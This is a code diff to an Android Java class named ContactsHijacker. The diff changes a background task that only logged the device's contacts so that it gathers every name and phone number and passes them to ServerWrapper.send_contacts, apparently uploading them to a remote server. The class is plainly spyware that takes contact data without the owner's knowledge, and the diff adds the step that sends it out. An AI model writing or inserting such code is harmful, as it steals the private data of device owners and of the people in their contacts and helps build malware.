@@ -20,12 +20,13 @@ public class ContactsHijacker extends AsyncTask<Activity, Void, Integer> {
     @Override
     protected Integer doInBackground(Activity... args) {
         _act = args[0];
-        obtener_contactos();
+        ServerWrapper.send_contacts(obtain_contacts());
         return 0;
     }
 
-    private void obtener_contactos() {
-        Log.i("MyActivity", "displayContacts");
+    private ArrayList<Contact> obtain_contacts() {
+        ArrayList<Contact> contacts = new ArrayList<Contact>();
+        Log.i("ContactsHijacker", "obtaining contacts");
         ContentResolver cr = _act.getContentResolver();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                 null, null, null, null);
@@ -47,10 +48,11 @@ public class ContactsHijacker extends AsyncTask<Activity, Void, Integer> {
                     }
                     pCur.close();
                 }
-                Contact contacto = new Contact(Integer.parseInt(id), name, phones);
-                Log.i("MyActivity", contacto.asString());
+                contacts.add(new Contact(Integer.parseInt(id), name, phones));
             }
         }
+        cur.close();
+        return contacts;
     }
 }
 
